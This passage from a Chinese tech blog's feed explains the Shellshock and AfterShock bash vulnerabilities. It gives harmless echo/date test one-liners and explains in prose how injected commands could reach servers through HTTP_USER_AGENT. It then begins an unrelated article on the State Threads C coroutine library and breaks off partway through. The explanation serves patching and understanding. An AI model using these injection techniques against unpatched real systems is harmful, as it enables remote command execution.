<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#bash%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F" title="bash的环境变量">bash的环境变量</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#bash%E7%9A%84%E5%87%BD%E6%95%B0" title="bash的函数">bash的函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#bash%E7%9A%84bug" title="bash的bug">bash的bug</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#bash%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BD%B1%E5%93%8D%E6%9C%89%E5%A4%9A%E5%A4%A7" title="bash漏洞的影响有多大">bash漏洞的影响有多大</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%B3%E4%BA%8E_AfterShock_-_CVE-2014-7169_%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC%E7%9A%84%E8%A7%A3%E9%87%8A" title="关于 AfterShock – CVE-2014-7169 测试脚本的解释">关于 AfterShock – CVE-2014-7169 测试脚本的解释</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Shellshock_CVE-2014-6271"></span>Shellshock (CVE-2014-6271)<span class="ez-toc-section-end"></span>
</h4>
<p>下面是一个简单的测试：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"</code></p>
<p>如果你发现上面这个命令在你的bash下有这样的输出，那你就说明你的bash是有漏洞的：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">Bash is vulnerable!
Bash Test</pre>
<p>简单地看一下，其实就是向环境变量中注入了一段代码 <strong>echo Bash is vulnerable</strong>。关于其中的原理我会在后面给出。</p>
<p>很快，CVE-2014-6271的官方补丁出来的了——<a href="https://lists.gnu.org/archive/html/bug-bash/2014-09/msg00081.html" target="_blank">Bash-4.3 Official Patch 25</a>。</p>
<p><span id="more-11973"></span></p>
<h4>
<span class="ez-toc-section" id="AfterShock_-_CVE-2014-7169_%EF%BC%88%E5%8F%88%E5%8F%ABIncomplete_fix_to_Shellshock%EF%BC%89"></span>AfterShock – CVE-2014-7169 （又叫Incomplete fix to Shellshock）<span class="ez-toc-section-end"></span>
</h4>
<p>但随后，马上有人在Twitter上发贴——<a href="https://twitter.com/taviso/statuses/514887394294652929" target="_blank">说这是一个不完整的fix</a>，并给出了相关的攻击方法。</p>
<p><a href="https://twitter.com/taviso/statuses/514887394294652929" target="_blank"><img alt="image placeholder" ></a></p>
<p>也就是下面这段测试代码（注意，其中的sh在linux下等价于bash）：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">env X='() { (a)=&gt;\' sh -c "echo date"; cat echo</code></p>
<p>上面这段代码运行起来会报错，但是它要的就是报错，报错后会在你在当前目录下生成一个echo的文件，这个文件的内容是一个时间文本。下面是上面 这段命令执行出来的样子。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ env X='() { (a)=&gt;\' sh -c "echo date"; cat echo
sh: X: line 1: syntax error near unexpected token `='
sh: X: line 1: `'
sh: error importing function definition for `X'
Sat Sep 27 22:06:29 CST 2014</pre>
<p>这段测试脚本代码相当的诡异，就像“天书”一样，我会在后面详细说明这段代码的原理。</p>
<h4>
<span class="ez-toc-section" id="%E5%8E%9F%E7%90%86%E5%92%8C%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82"></span>原理和技术细节<span class="ez-toc-section-end"></span>
</h4>
<p>要说清楚这个原理和细节，我们需要从 bash的环境变量开始说起。</p>
<h5>
<span class="ez-toc-section" id="bash%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"></span>bash的环境变量<span class="ez-toc-section-end"></span>
</h5>
<p>环境变量大家知道吧，这个不用我普及了吧。环境变量是操作系统运行shell中的变量，很多程序会通过环境变量改变自己的执行行为。在bash中要定义一个环境变量的语法很简单（注：=号的前后不能有空格）：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ var="hello world"</code></p>
<p>然后你就可以使用这个变量了，比如：echo $var什么的。但是，我们要知道，这个变量只是一个当前shell的“局部变量”，只在当前的shell进程中可以访问，这个shell进程fork出来的进程是访问不到的。</p>
<p>你可以做这样的测试：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ var="hello coolshell"
$ echo $var
hello coolshell
$ bash
$ echo $var
</pre>
<p>上面的测试中，第三个命令执行了一个bash，也就是开了一个bash的子进程，你就会发现var不能访问了。</p>
<p>为了要让shell的子进程可以访问，我们需要export一下：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ export var="hello coolshell"</code></p>
<p>这样，这个环境变量就会在其子进程中可见了。</p>
<p>如果你要查看一下有哪些环境变量可以在子进程中可见（也就是是否被export了），你可使用<strong>env</strong>命令。不过，env命令也可以用来定义export的环境变量。如下所示：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ env var="hello haoel"</code></p>
<p>有了这些基础知识还不够，我们还要知道一个基础知识——shell的函数。</p>
<h5>
<span class="ez-toc-section" id="bash%E7%9A%84%E5%87%BD%E6%95%B0"></span>bash的函数<span class="ez-toc-section-end"></span>
</h5>
<p>在bash下定义一个函数很简单，如下所示：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ foo(){ echo "hello coolshell"; }
$ foo
hello coolshell</pre>
<p>有了上面的环境变量的基础知识后，你一定会想试试这个函数是否可以在子进程中调用，答案当然是不行的。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ foo(){ echo "hello coolshell"; }
$ foo
hello coolshell
$ bash
$ foo
bash: foo: command not found</pre>
<p>你看，和环境变量是一样的，如果要在子进程中可以访问的话，那么，还是一样的，需要export，export有个参数 -f，意思是export一个函数。如：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="4">$ foo(){ echo "hello coolshell"; }
$ foo
hello coolshell
$ export -f foo
$ bash
$ foo
hello coolshell</pre>
<p>好了，我讲了这么半天的基础知识，别烦，懂了这些，你才会很容易地理解这两个漏洞是怎么回事。</p>
<p>好，现在要进入正题。</p>
<h5>
<span class="ez-toc-section" id="bash%E7%9A%84bug"></span>bash的bug<span class="ez-toc-section-end"></span>
</h5>
<p>从上面我们可以看到，bash的变量和函数用了一模一样的机制，如果你用env命令看一下export出来的东西，你会看到上面我们定义的变量和函数都在，如下所示（我省略了其它的环境变量）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ env
var=hello coolshell
foo=() { echo "hello coolshell"
}</pre>
<p>原来，都用同样的方式啊——<strong>无论是函数还是变量都是变量啊</strong>。于是，看都不用看bash的源代码，聪明的黑客就能猜得到——<strong>bash判断一个环境变量是不是一个函数，就看它的值是否以”()”开始</strong>。于是，一股邪念涌上心头。</p>
<p>黑客定义了这样的环境变量（注：() 和 { 间的空格不能少）：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ export X='() { echo "inside X"; }; echo "outside X";'</code></p>
<p>env一下，你会看到X已经在了：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ env
X=(){ echo "inside X"; }; echo "outside X";</pre>
<p>然后，<strong>当我们在当前的bash shell进程下产生一个bash的子进程时，新的子进程会读取父进程的所有export的环境变量，并复制到自己的进程空间中，很明显，上面的X变量的函数的后面还注入了一条命令：echo “outside X”，这会在父进程向子进程复制的过程中被执行吗？</strong>（关于fork相关的东西你可以看一下我以前写的《<a title="一个fork的面试题" href="https://coolshell.cn/articles/7965.html" target="_blank">fork的一个面试题</a>》）</p>
<p>答案是肯定的。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ export X='() { echo "inside X"; }; echo "outside X";'
$ bash
outside X</pre>
<p>你看，一个代码注入就这样完成了。这就是bash的bug—— <strong>函数体外面的代码被默认地执行了</strong>。</p>
<p>我们并不一定非要像上面那样创建另一个bash的子进程，我们可以使用bash -c的参数来执行一个bash子进程命令。就像这个安全漏洞的测试脚本一样：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"</code></p>
<p>其中，() { :;} 中的冒号就相当于/bin/true，返回true并退出。而bash -c其实就是在spawn一个bash的echo的子进程，用于触发函数体外的echo命令。所以，更为友好一点的测试脚本应该是：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo 如果你看到了vulnerable字样说明你的bash有安全问题"</code></p>
<p>OK，你应该明白这个漏洞是怎么一回事了吧。</p>
<h4>
<span class="ez-toc-section" id="bash%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BD%B1%E5%93%8D%E6%9C%89%E5%A4%9A%E5%A4%A7"></span>bash漏洞的影响有多大<span class="ez-toc-section-end"></span>
</h4>
<p>在网上看到好多人说这个漏洞不大，还说这个事只有那些陈旧的执行CGI脚本的网站才会有，现在已经没有网站用CGI了。我靠，这真是无知者无畏啊。</p>
<p>我举个例子，如果你的网站中有调用操作系统的shell命令，比如你用PHP执行个exec之类的东西。这样的需求是有的，特别是对于一些需要和操作系统交互的重要的后台用于系统管理的程序。于是就会开一个bash的进程来执行。</p>
<p>我们还知道，现在的HTTP服务器基本上都是以子进程式的，所以，其中必然会存在export 一些环境变量的事，而有的环境变量的值是从用户端来的，比如：HTTP_USER_AGENT这样的环境变量，只由浏览器发出的。其实这个变量你想写成什么就写成什么。</p>
<p>于是，我可以把这个HTTP_USER_AGENT的环境变量设置成上述的测试脚本，只不过，我会把echo Bash is vulnerable!这个东西换成别的更为凶残的命令。呵呵。</p>
<p>关于这个漏洞会影响哪些已有的系统，你可以自己Google，几乎所有的报告这个漏洞的文章都说了（比如：<a href="https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/" target="_blank">这篇</a>，<a href="https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability" target="_blank">这篇</a>），我这里就不复述了。</p>
<p>注：如果你要看看你的网站有没有这样的问题，你可以用这个在线工具测试一下：<a href="http://shellshock.brandonpotter.com/">‘ShellShock’ Bash Vulnerability CVE-2014-6271 Test Tool</a>。</p>
<p>现在，你知道这事可能会很大了吧。还不赶快去打补丁。（注，yum update bash 把bash版本升级到 4.1.2-15.el6_5.2 ， ）</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E_AfterShock_-_CVE-2014-7169_%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC%E7%9A%84%E8%A7%A3%E9%87%8A"></span>关于 AfterShock – CVE-2014-7169 测试脚本的解释<span class="ez-toc-section-end"></span>
</h4>
<p>很多同学没有看懂下面这个测试脚本是什么意思，我这里解释一下。</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">env X='() { (a)=&gt;\' sh -c "echo date"; cat echo</code></p>
<ul>
<li>X='() { (a)=&gt;\’ 这个不用说了，定义一个X的环境变量。但是，这个函数不完整啊，是的，这是故意的。另外你一定要注意，\’不是为了单引号的转义，X这个变量的值就是 <strong>() { (a)=&gt;\</strong>
</li>
</ul>
<ul>
<li>其中的 (a)=这个东西目的就是为了让bash的解释器出错（语法错误）。</li>
</ul>
<ul>
<li>语法出错后，在缓冲区中就会只剩下了 “&gt;\”这两个字符。</li>
</ul>
<ul>
<li>于是，这个神奇的bash会把后面的命令echo date换个行放到这个缓冲区中，然后执行。</li>
</ul>
<p>相当于在shell 下执行了下面这个命令：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ &gt;\
echo date</pre>
<p>如果你了解bash，你会知道 \ 是用于命令行上换行的，于是相当于执行了：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW"> $ &gt;echo date</code></p>
<p>这不就是一个重定向么？上述的命令相当于：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ date &gt; echo </code></p>
<p>于是，你的当前目录下会出现一个echo的文件，这个文件的内容就是date命令的输出。</p>
<p><strong>能发现这个种玩法的人真是个变态，完全是为bash的源代码量身定制的一个攻击</strong>。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-09-28T07:56:46+08:00</pubDate>
<guid>https://coolshell.cn/articles/11973.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ State Threads 回调终结者 ]]></title>
<link>https://coolshell.cn/articles/12012.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 </strong><a href="https://weibo.com/fullofbull" target="_blank"><strong>@我的上铺叫路遥</strong></a><strong> 投稿）</strong></p>
<p>上回写了篇<a title="一个“蝇量级” C 语言协程库" href="https://coolshell.cn/articles/10975.html" target="_blank">《一个“蝇量级”C语言协程库》</a>，推荐了一下<a title="Protothreads" href="http://dunkels.com/adam/pt/" target="_blank">Protothreads</a>，通过coroutine模拟了用户级别的multi-threading模型，虽然本身足够“轻”，杜绝了系统开销，但这个库本身应用场合主要是内存限制的嵌入式领域，提供原生态组件太少，使用限制太多，比如依赖其它调用产生阻塞等。</p>
<p>这回又替大家在开源界淘了个宝，推荐一个轻量级网络应用框架<strong>State Threads</strong>（以下简称ST），总共也就3000行C代码，跟Protothreads不同在于ST针对的就是<strong>高性能可扩展服务器</strong>领域（值得一提的是Protothreads官网<a title="参考链接" href="http://dunkels.com/adam/pt/links.html" target="_blank">参考链接</a>上第一条就是ST的官网）。在其<a title="FAQ" href="http://state-threads.sourceforge.net/docs/faq.html" target="_blank">FAQ</a>页面上一句引用”Perfection is achieved not when there is nothing more to add, but rather when there is nothing more to take away.”可以视为开发人员对ST源码质量的自信。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%8E%86%E5%8F%B2%E6%B8%8A%E6%BA%90" title="历史渊源">历史渊源</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%9F%BA%E4%BA%8E%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E7%8A%B6%E6%80%81%E6%9C%BA%EF%BC%88EDSM%EF%BC%89" title="基于事件驱动状态机（EDSM）">基于事件驱动状态机（EDSM）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%9F%BA%E4%BA%8EMult-Threading%E8%8C%83%E5%BC%8F" title="基于Mult-Threading范式">基于Mult-Threading范式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%9F%BA%E4%BA%8E%E5%A4%9A%E6%A0%B8%E7%8E%AF%E5%A2%83" title="基于多核环境">基于多核环境</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E4%BD%BF%E7%94%A8%E9%99%90%E5%88%B6" title="使用限制">使用限制</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%8E%86%E5%8F%B2%E6%B8%8A%E6%BA%90"></span>历史渊源<span class="ez-toc-section-end"></span>
</h4>
<p>首先介绍一下这个库的历史渊源，从代码贡献者来看，ST不是个人作品，而是有着雄厚的商业支持和应用背景，比如服务器领域，在<a href="http://state-threads.sourceforge.net/news.html" target="_blank">这里</a>你可以看到ST曾作为Apache的多核应用模块发布。其诞生最初是由网景（Netscape）公司的MSPR（Netscape Portable Runtime library）项目中剥离出来，后由SGI（Silicon Graphic Inc）还有Yahoo!公司（前者是主力）开发维护的独立线程库。历史版本方面，作为<a title="SourceForge" href="https://sourceforge.net/projects/state-threads/files/" target="_blank">SourceForge</a>上开源项目，由2001年发布v1.0以来一直到2009年v1.9稳定版后未再变动。在平台移植方面，从Makefile的配置选项中可知ST支持多种Unix-like平台，还有专门针对Win32的源码改写。源码例子中，提供了web server、proxy以及dns三种编程实例供参考。可以说代码质量应该是相当的稳定和可靠的。</p>
<p><span id="more-12012"></span></p>
<p>至于许可证方面，有必要略作说明。出于历史原因，网景最初发布时选择了MPL1.1许可证，而后SGI在维护中又混进了GPLv2许可证，照理说这两种许可证是互不兼容的（MPL1.1后续版本是GPL兼容的），也就是说用双许可证打包发布理论上是非法无效的，见GNU官网上<a title="GPL兼容" href="https://www.gnu.org/licenses/license-list.html#MPL" target="_blank">MPL兼容性</a>一节。但这里有值得商榷的地方，因为文中又提及，根据MPL1.1中某条款第13节，如果整段或部分代码允许采用另一许可证作为备用（alternate）选择，比如GPL及其兼容，那么整个库的许可证就可视为GPL兼容的。如此一来所谓GPL兼容性一般解释为你不能在GPLv2的代码中混入MPL1.1，而不是说你不能在MPL1.1代码中混入GPLv2，也就是说GPLv2在MPL1.1之后是可以接受的，事实上SGI就采用了后面的做法，尚未引起版权上的纠纷。为此我还考证了一下FAQ上<a title="license" href="http://state-threads.sourceforge.net/docs/faq.html" target="_blank">license</a>一节的说法，说ST既可以在MPL和GPL之间选择一种，也可以继续用双许可证，还补了一句在non-free项目使用上也没有限制，但对ST源码所做改动必须对用户可见。在源码文件中的SGI的附加声明还解释了将ST转为GPL代码的做法，就是可以删除前面MPL的声明，否则后续用户仍可以在两者之间二选一。个人觉得既然SGI都这样发话了，那么可解释为反之删除GPL的声明继续采用MPL也是可以接受的，如果你对双许可证承诺仍不放心的话。</p>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E4%BA%8E%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E7%8A%B6%E6%80%81%E6%9C%BA%EF%BC%88EDSM%EF%BC%89"></span>基于事件驱动状态机（EDSM）<span class="ez-toc-section-end"></span>
</h4>
<p>好了，下面该进入技术性话题了。前面说了ST的目标是<strong>高性能可扩展</strong>，其技术特征一言以蔽之就是</p>
<blockquote><p><strong>“It combines the simplicity of the multi-threaded programming paradigm, in which one thread supports each simultaneous connection, with the performance and scalability of an event-driven state machine (EDSM) architecture.”</strong></p></blockquote>
<p>我们先来纵向比较ST与传统的EDSM区别，再来横向比较与其它线程库（比如Pthread）的区别（注：以下图片全部来自<a title="ST FAQ" href="http://state-threads.sourceforge.net/docs/faq.html" target="_blank">State Threads Library FAQ</a>）。</p>
<p>传统EDSM最常见的方式就是I/O事件的<strong>异步回调</strong>。基本上都会有一个叫做dispatcher的单线程主循环（又叫event loop），用户通过向dispatcher注册回调函数（又叫event handler）来实现异步通知，从而不必在原地空耗资源干等，在dispatcher主循环中通过select()/poll()系统调用来等待各种I/O事件的发生，当内核检测到事件触发并且数据可达或可用时，select()/poll()会返回从而使dispatcher调用相应的回调函数来对处理用户的请求。所以异步回调与其说是通知，不如说用委托更恰当。</p>
<p>整个过程都是单线程的。<strong>这种处理本质上就是将一堆互不相交（disjoint）的回调实现同步控制，就像串联在一个顺序链表上。</strong>见图1，黑色的双箭头表示I/O事件复用，回调是个筐，里面装着对各种请求的处理（当然不是每个请求都有回调，一个请求也可以对应不同的回调），每个回调被串联起来由dispatcher激活。这里请求等价于thread的概念（不是操作系统的线程），只不过“上下文切换”（context switch）发生在每个回调结束之时（假设不同请求对应不同回调），注册下一个回调以待事件触发时恢复其它请求的处理。至于dispatcher的执行状态（execute state）可作为回调函数的参数保存和传递。</p>
<p><img alt="image placeholder" ></p>
<p>异步回调的缺陷在于<strong>难以实现和扩展</strong>，虽然已经有libevent这样的通用库，以及其它actor/reacotor的设计模式及其框架，但正如Dean Gaudet（Apache开发者）所说：“其内在的复杂性——<strong>将线性思维分解成一堆回调的负担</strong>（breaking up linear thought into a bucketload of callbacks）——仍然存在”。从上图可见，<strong>回调之间请求例程不是连续的，比如回调之间的切换会打断部分请求，又比如有新的请求需要重新注册。</strong></p>
<p><strong>ST本质上仍然是基于EDSM模型，但旨在取代传统的异步回调方式。</strong>ST将请求抽象为thread概念以更接近自然编程模式（所谓的linear thought吧，就像操作系统的线程之间切换那样自然）。ST的调度器（scheduler）对于用户来说是透明的，不像dispatcher那种将执行状态（execute state）暴露给回调方式。每个thread的现场环境可以保存在栈上（一段连续的大小确定的内存空间），由C的运行环境管理。从图2看到，<strong>ST的threads可以并发地线性地处理I/O事件，模型比异步回调简单得多。</strong></p>
<p><img alt="image placeholder" ></p>
<p>这里稍微解释一下ST调度工作原理，ST运行环境维护了四种队列，分别是IOQ、RUNQ、SLEEPQ以及ZOMBIEQ，<strong>当每个thread处于不同队列中对应不同的状态（ST顾名思义所谓thread状态机）。</strong>比如polling请求的时候，当前thread就加入IOQ表示等待事件（如果有timeout同时会被放到SLEEPQ中），当事件触发时，thread就从IOQ（如果有timeout同时会从SLEEPQ）移除并转移到RUNQ等待被调度，成为当前的running thread，相当于操作系统的就绪队列，跟传统EDSM对应起来就是注册回调以及激活回调。再比如模拟同步控制wait/sleep/lock的时候，当前thread会被放入SLEEPQ，直到被唤醒或者超时再次进入RUNQ以待调度。</p>
<p><strong>ST的调度具备性能与内存双重优点</strong>：在性能上，ST实现自己的setjmp/longjmp来模拟调度，无任何系统开销，并且context（就是jmp_buf）针对不同平台和架构用底层语言实现的，可移植性媲美libc。下面放一段代码解释一下调度实现：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">/*
 * Switch away from the current thread context by saving its state 
 * and calling the thread scheduler
 */
#define _ST_SWITCH_CONTEXT(_thread)       \
    ST_BEGIN_MACRO                        \
    if (!MD_SETJMP((_thread)-&gt;context)) { \
      _st_vp_schedule();                  \
    }                                     \
    ST_END_MACRO

/*
 * Restore a thread context that was saved by _ST_SWITCH_CONTEXT 
 * or initialized by _ST_INIT_CONTEXT
 */
#define _ST_RESTORE_CONTEXT(_thread)   \
    ST_BEGIN_MACRO                     \
    _ST_SET_CURRENT_THREAD(_thread);   \
    MD_LONGJMP((_thread)-&gt;context, 1); \
    ST_END_MACRO

void _st_vp_schedule(void)
{
    _st_thread_t *thread;

    if (_ST_RUNQ.next != &amp;_ST_RUNQ) {
        /* Pull thread off of the run queue */
        thread = _ST_THREAD_PTR(_ST_RUNQ.next);
        _ST_DEL_RUNQ(thread);
    } else {
        /* If there are no threads to run, switch to the idle thread */
        thread = _st_this_vp.idle_thread;
    }
    ST_ASSERT(thread-&gt;state == _ST_ST_RUNNABLE);

    /* Resume the thread */
    thread-&gt;state = _ST_ST_RUNNING;
    _ST_RESTORE_CONTEXT(thread);
}
</pre>
<p>如果你熟悉setjmp/longjmp的用法，你就知道当前thread在调用MD_SETJMP将现场上下文保存在jmp_buf中并返回返回0，然后自己调用_st_vp_schedule()将自己调度出去。调度器先从RUNQ上找，如果队列为空就找idle thread，这是在整个ST初始化时创建的一个特殊thread，然后将当前线程设为自己，再调用MD_LONGJMP切换到其上次调用MD_SETJMP的地方，从thread-&gt;context恢复现场并返回1，该thread就接着往下执行了。<strong>整个过程就同EDSM一样发生在操作系统单线程下，所以没有任何系统开销与阻塞。</strong></p>
<p><strong>其实真正的阻塞是发生在等待I/O事件复用上，也就是select()/poll()，这是整个ST唯一的系统调用。</strong>ST当前的状态是，整个环境处于空闲状态，所有threads的请求处理都已经完成，也就是RUNQ为空。这时在_st_idle_thread_start维护了一个主循环（类似于event loop），主要负责三种任务：1.对IOQ所有thread进行I/O复用检测；2.对SLEEPQ进行超时检查；3.将idle thread调度出去，代码如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void *_st_idle_thread_start(void *arg)
{
    _st_thread_t *me = _ST_CURRENT_THREAD();

    while (_st_active_count &gt; 0) {
        /* Idle vp till I/O is ready or the smallest timeout expired */
        _ST_VP_IDLE();

        /* Check sleep queue for expired threads */
        _st_vp_check_clock();

        me-&gt;state = _ST_ST_RUNNABLE;
        _ST_SWITCH_CONTEXT(me);
    }

    /* No more threads */
    exit(0);

    /* NOTREACHED */
    return NULL;
}</pre>
<p>这里的me就是idle thread，因为_st_idle_thread_start就是创建idle thread的启动点，每从上次_ST_SWITCH_CONTEXT()切换回来的时候，接着在_ST_VP_IDLE()里轮询I/O事件的发生，一旦检测到发生了别的thread事件或者SLEEPQ里面发生超时，再用_ST_SWITCH_CONTEXT()把自己切换出去，如果此时RUNQ中非空的话就切换到队列第一个thread。这里主循环是不会退出的。</p>
<p>在内存方面，<strong>ST的执行状态作为局部变量保存在栈上，而不是像回调需要动态分配，</strong>用户可能分别这样使用thread模式和callback模式：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">/* thread land */
int foo()
{
    int local1;
    int local2;
    do_some_io();
}

/* callback land */
struct foo_data {
    int local1;
    int local2;
};

void foo_cb(void *arg)
{
    struct foo_data *locals = arg;
    ...
}

void foo()
{
    struct foo_data *locals = malloc(sizeof(struct foo_data));
    register(foo_cb, locals);
}
</pre>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E4%BA%8EMult-Threading%E8%8C%83%E5%BC%8F"></span>基于Mult-Threading范式<span class="ez-toc-section-end"></span>
</h4>
<p>同样基于multi-threading编程范式，ST同其它线程库又有和有点呢？比如Posix Thread（以下简称PThread）是个通用的线程库，它是<strong>将用户级线程（thread）同内核执行对象（kernel execution entity，有些书又叫lightweight processes）做了1:1或m:n映射，</strong>从而实现multi-threading模式。<strong>而ST是单线程（n:1映射），它的thread实际上就是协程（coroutine）。</strong>通常的网络应用上，多线程范式绕不开操作系统，但在某些特定的服务器领域，线程间的共享资源会带来额外复杂度，锁、竞态、并发、文件句柄、全局变量、管道、信号等，面对这些Pthread的灵活性会大打折扣。<strong>而ST的调度是精确的，它只会在明确的I/O和同步函数调用点上发生上下文切换，这正是协程的特性，如此一来ST就不需要互斥保护了，进而也可以放心使用任何静态变量和不可重入库函数了</strong>（这在同样作为协程的Protothreads里是不允许的，因为那是stack-less的，无法保存上下文），极大的简化了编程和调试同时增加了性能。</p>
<p>对于同样用户级线程如GNU Pth和MIT Phread比起来呢？有两点，一是ST的thread是<strong>无优先级的非抢占式调度</strong>，也就是说ST基于EDSM的，每个thread都是事件或数据驱动，迟早会把自己调度出去，而且调度点是明确的，并非按时间片来的，从而简化了thread管理；二是ST会<strong>忽略所有信号处理</strong>，在_st_io_init中会把sigact.sa_handler设为SIG_IGN，这样做是因为将thread资源最小化，避免了signal mask及其系统调用（在ucontext上是避免不了的）。但这并不意味着ST就不能处理信号，实际上ST建议将信号写入pipe的方式转化为普通I/O事件处理，示例详见<a title="signal handling" href="http://state-threads.sourceforge.net/docs/notes.html#signals" target="_blank">这里</a>。</p>
<p>这里顺便说一句，<strong>C语言实现的协程据我所知只有三种方式</strong>：Protothread为代表利用switch-case语义跳转，以ST为代表不依赖libc的setjmp/longjmp上下文切换，以及依赖glibc的ucontext接口（<a title="云风的coroutine" href="https://github.com/cloudwu/coroutine" target="_blank">云风的coroutine</a>）。第一种最轻，但受限最大，第三种耗资源性能慢（陈皓注：glibc的ucontext接口的实现中有一个和信号有关的系统调用，所以会慢，估计在一些情况下会比pthread还慢），目前看来ST是最好使的。</p>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E4%BA%8E%E5%A4%9A%E6%A0%B8%E7%8E%AF%E5%A2%83"></span>基于多核环境<span class="ez-toc-section-end"></span>
</h4>
<p>下面来聊聊ST在多核环境下的应用。服务器领域多核的优势在于实现了物理上真正的并发，所以如何充分利用系统优势也是线程库的一大难点。这对ST来说也许正是它的拿手好戏，前面提及ST曾作为Apache的多核引擎模块发布。这里要补充一下前面漏掉的ST的一个重要概念——<strong>虚拟处理器</strong>（virtual processor，简称vp），见图3，多个cpu通过内核的SMP模拟出多个“核”（core），一个core对应一个内核任务（kernel task），同时对应一个用户进程（process），一个process对应ST的一个vp，每个vp下就是ST的thread（是协程不是线程），结合前面所述，vp初始化先创建idle thread，然后根据I/O事件驱动其它threads，这就是ST的多核架构。</p>
<p><img alt="image placeholder" ></p>
<p>这里要指出的是，<strong>ST只负责自身thread调度，进程管理是应用程序的事情，</strong>也就是说由用户来决定fork多少进程，每个进程分配多少资源，如何进行IPC等。这种架构的好处就是每个vp有自己独立的空间，避免了资源同步竞态（比如杜绝了多进程里的多线程这样混乱的模型）。我们知道这种<strong>基于进程的架构是非常健壮的，一个进程奔溃不会影响到其它进程，同时充分利用多核硬件的高并发。</strong>同时对于具体逻辑业务使用vp里的thread处理，这是基于EDSM的，如此一来做到了<strong>逻辑业务与内核执行对象之间的解耦</strong>，没必要因为1K个连接去创建1K的进程。这就是ST的扩展性和灵活性。</p>
<h4>
<span class="ez-toc-section" id="%E4%BD%BF%E7%94%A8%E9%99%90%E5%88%B6"></span>使用限制<span class="ez-toc-section-end"></span>
</h4>
